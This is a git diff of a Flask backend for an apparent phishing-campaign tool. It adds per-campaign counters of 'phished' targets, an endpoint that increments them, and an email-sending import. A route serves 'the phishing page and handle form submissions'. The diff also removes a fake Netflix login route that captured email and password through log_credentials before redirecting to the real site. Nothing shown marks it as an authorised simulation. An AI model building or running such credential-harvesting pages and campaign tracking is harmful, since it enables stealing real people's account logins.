@@ -7,6 +7,8 @@ from flask_cors import CORS
 from flask import Flask, render_template, request, redirect, jsonify
 from utils.html_manipulation import create_js_script, add_script_to_html
 from utils.date_and_time import get_current_date
+from utils.mails import send_email
+
 app = Flask(__name__)
 CORS(app)
 
@@ -60,7 +62,7 @@ def create_new_campaign_db(user_id, campaign_name):
 
     return campaign_db_path
 
-def create_campaigns_db(user_id, campaign_name, page_name, users_number=0, template=False):
+def create_campaigns_db(user_id, campaign_name, page_name, targets_number=0, template=False):
     user_folder = f"{USERS_DIR}/{user_id}"
     campaigns_db_dir = os.path.join(user_folder, CAMPAIGNS_DIR)
     db_path = os.path.join(campaigns_db_dir, CAMPAIGNS_DB)
@@ -72,7 +74,6 @@ def create_campaigns_db(user_id, campaign_name, page_name, users_number=0, templ
         conn = sqlite3.connect(db_path)
         cursor = conn.cursor()
 
-        
         # Create the campaigns table if it doesn't exist
         cursor.execute(f"""
             CREATE TABLE IF NOT EXISTS campaigns (
@@ -81,7 +82,8 @@ def create_campaigns_db(user_id, campaign_name, page_name, users_number=0, templ
                 date_created DATE,
                 time_created TIME,
                 page_name TEXT DEFAULT "{page_name}",
-                users_number INTEGER DEFAULT {users_number},
+                targets_number INTEGER DEFAULT {targets_number},
+                phised_number INTEGER DEFAULT 0,
                 template INTEGER DEFAULT {1 if template else 0}
             )
         """)
@@ -90,9 +92,9 @@ def create_campaigns_db(user_id, campaign_name, page_name, users_number=0, templ
 
         # Insert new campaign if it doesn't exist
         cursor.execute("""
-            INSERT INTO campaigns (name, date_created, time_created, page_name, users_number, template)
+            INSERT INTO campaigns (name, date_created, time_created, page_name, targets_number, template)
             VALUES (?, ?, ?, ?, ?, ?)
-        """, (campaign_name, date_created, time_created, page_name, users_number, template))
+        """, (campaign_name, date_created, time_created, page_name, targets_number, template))
 
         conn.commit()
         print(f"Campaign '{campaign_name}' added to the database.")
@@ -149,23 +151,34 @@ def fetch_data(db_path, table_name):
     # Convert to list of dictionaries
     return [dict(zip(columns, row)) for row in campaigns]
 
-# def fetch_campaign_data(db_path):
-#     """Fetch content from a specific campaign database and return as a list of dictionaries."""
-#     conn = sqlite3.connect(db_path)
-#     cursor = conn.cursor()
+def update_phised_number(db_path, campaign_name, increment: int = 1):
+    """
+    Update the phised_number for a specific campaign by incrementing it.
 
-#     # Fetch column names
-#     cursor.execute("PRAGMA table_info(credentials)")
-#     columns = [column[1] for column in cursor.fetchall()]  # Extract column names
+    :param db_path: Path to the SQLite database.
+    :param campaign_name: Name of the campaign to update.
+    :param increment: The number to increase phised_number by (default is 1).
+    """
+    try:
+        conn = sqlite3.connect(db_path)
+        cursor = conn.cursor()
 
-#     # Fetch all rows
-#     cursor.execute("SELECT * FROM credentials")
-#     campaigns = cursor.fetchall()
+        cursor.execute("""
+            UPDATE campaigns
+            SET phised_number = phised_number + ?
+            WHERE name = ?
+        """, (increment, campaign_name))
 
-#     conn.close()
+        if cursor.rowcount == 0:  # No rows updated
+            print(f"Error: No campaign found with name '{campaign_name}'")
+        else:
+            print(f"Successfully updated phised_number for campaign '{campaign_name}'")
 
-#     # Convert to list of dictionaries
-#     return [dict(zip(columns, row)) for row in campaigns]
+        conn.commit()
+        conn.close()
+
+    except sqlite3.Error as e:
+        print(f"Error updating phised_number: {e}")
 
 def remove_db_file(file_name):
     if os.path.exists(file_name):
@@ -229,7 +242,6 @@ def get_campaigns(user_id):
         
     return jsonify(campaigns), 200
 
-
 @app.route('/campaigns/fetch_campaign', methods=['POST'])
 def get_campaign():
     data = request.json
@@ -286,7 +298,7 @@ def create_campaign():
     campaign_name = data.get("name")
     template = data.get("template")
     page_name = data.get("page_name")
-
+    targets_number = data.get("targets_number")
 
     user_folder = f"{USERS_DIR}/{user_id}/{DBS_DIR}"
     campaign_db_file = os.path.join(user_folder, f"{campaign_name}.db")
@@ -303,7 +315,7 @@ def create_campaign():
         user_id=user_id, 
         campaign_name=campaign_name, 
         page_name=page_name, 
-        users_number=0, 
+        targets_number=targets_number, 
         template=template
         )
     
@@ -319,7 +331,20 @@ def create_campaign():
             "message": "Campaign created successfully", 
             "js": campaign_js_script
         }), 200
- 
+
+@app.route('/campaign/<user_id>/<campaign_name>/phished', methods=['GET', 'POST'])
+def campaign_page_phised(user_id, campaign_name):
+    campaigns_db_path = os.path.join(USERS_DIR, user_id, CAMPAIGNS_DIR, "campaigns.db")
+
+    if not os.path.exists(campaigns_db_path):
+        return 'Not found', 404
+    
+    update_phised_number(
+        db_path=campaigns_db_path, 
+        campaign_name=campaign_name)
+    
+    return "", 200
+
 @app.route('/campaign/<user_id>/<campaign_name>', methods=['GET', 'POST'])
 def campaign_page(user_id, campaign_name):
     """ Serve the phishing page and handle form submissions """
@@ -385,20 +410,12 @@ def list_templates():
         return jsonify({"error": str(e)}), 500
 
 @app.route('/')
-def facebook():
+def home():
     
-    return render_template('facebook.html')
+    
+    return 'here', 200
 
-@app.route('/netflix', methods=['GET', 'POST'])
-def netflix():
-    """Fake Netflix login page"""
-    if request.method == 'POST':
-        username = request.form.get('email')
-        password = request.form.get('password')
-        log_credentials("Netflix", username, password)
-        return redirect("https://www.netflix.com/")  # Redirect after capturing
 
-    return render_template('netflix.html')
 
 
 if __name__ == '__main__':
